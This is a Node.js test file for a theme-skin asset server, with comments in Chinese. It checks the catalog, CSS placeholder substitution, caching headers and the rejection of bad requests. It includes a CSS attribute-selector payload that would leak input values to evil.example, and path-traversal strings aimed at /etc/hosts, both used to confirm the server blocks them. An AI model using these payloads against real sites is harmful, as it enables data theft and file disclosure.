/** 素材服务的测试。这半边不依赖 DSH，所以能在 CI 里跑真的 HTTP 请求。
 *  这个包是 ESM（DSH 的插件契约要求），所以测试也得是 ESM。 */
import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { createAssetServer } from "../lib/server.js";

const ROOT = fs.mkdtempSync(path.join(os.tmpdir(), "dsh-adapter-"));
const VARS = ":root{--color-bg:#101;--color-text:#eee;--color-accent:#7f9bff;}";
function skin(id, css, meta = {}) {
  const dir = path.join(ROOT, id);
  fs.mkdirSync(path.join(dir, "assets"), { recursive: true });
  fs.writeFileSync(path.join(dir, "skin.json"), JSON.stringify({ name: id, ...meta }));
  fs.writeFileSync(path.join(dir, "skin.css"), css);
  return dir;
}
skin("good", `${VARS}\n#app{background:url("__SKIN__/bg.svg")}`);
fs.writeFileSync(path.join(ROOT, "good", "assets", "bg.svg"),
  '<svg xmlns="http://www.w3.org/2000/svg" width="2" height="2"></svg>');
skin("leaky", `${VARS}\ninput[value^="a"]{background:url(https://evil.example/?a)}`);

let api = null;
let origin = "";

test.before(async () => {
  // 端口 0 让内核挑一个空闲的：写死端口会在 CI 上跟别的测试撞。
  api = createAssetServer({ roots: [ROOT], port: 0 });
  await new Promise((done, fail) => {
    api.server.once("error", fail);
    api.server.listen(0, "127.0.0.1", done);
  });
  origin = `http://127.0.0.1:${api.server.address().port}`;
});
test.after(() => { api.server.close(); fs.rmSync(ROOT, { recursive: true, force: true }); });

test("目录列出全部可用皮肤", async () => {
  const res = await fetch(`${origin}/catalog.json`);
  assert.equal(res.status, 200);
  const body = await res.json();
  assert.deepEqual(body.map((s) => s.id).sort(), ["good", "leaky"]);
});

test("干净皮肤给出可注入的 CSS，占位符已替换", async () => {
  const res = await fetch(`${origin}/css/good`);
  assert.equal(res.status, 200);
  const css = await res.text();
  assert.ok(!css.includes("__SKIN__"));
  assert.ok(css.includes("/skin/good/bg.svg"));
});

test("会外泄的皮肤在服务端就被拦下（409），不指望浏览器自觉", async () => {
  const res = await fetch(`${origin}/css/leaky`);
  assert.equal(res.status, 409);
  assert.match(await res.text(), /remote-url/);
});

test("素材取得到，且带长缓存", async () => {
  const res = await fetch(`${origin}/skin/good/bg.svg`);
  assert.equal(res.status, 200);
  assert.match(res.headers.get("content-type"), /svg/);
  assert.match(res.headers.get("cache-control"), /immutable/);
});

test("路径穿越取不到", async () => {
  for (const evil of ["/skin/good/../../../../etc/hosts", "/skin/good/..%2f..%2f..%2fetc%2fhosts"]) {
    assert.equal((await fetch(`${origin}${evil}`)).status, 404, evil);
  }
});

test("不存在的皮肤和路径都是 404", async () => {
  assert.equal((await fetch(`${origin}/css/nope`)).status, 404);
  assert.equal((await fetch(`${origin}/nope`)).status, 404);
});

test("只接受 GET / HEAD", async () => {
  assert.equal((await fetch(`${origin}/catalog.json`, { method: "POST" })).status, 405);
});
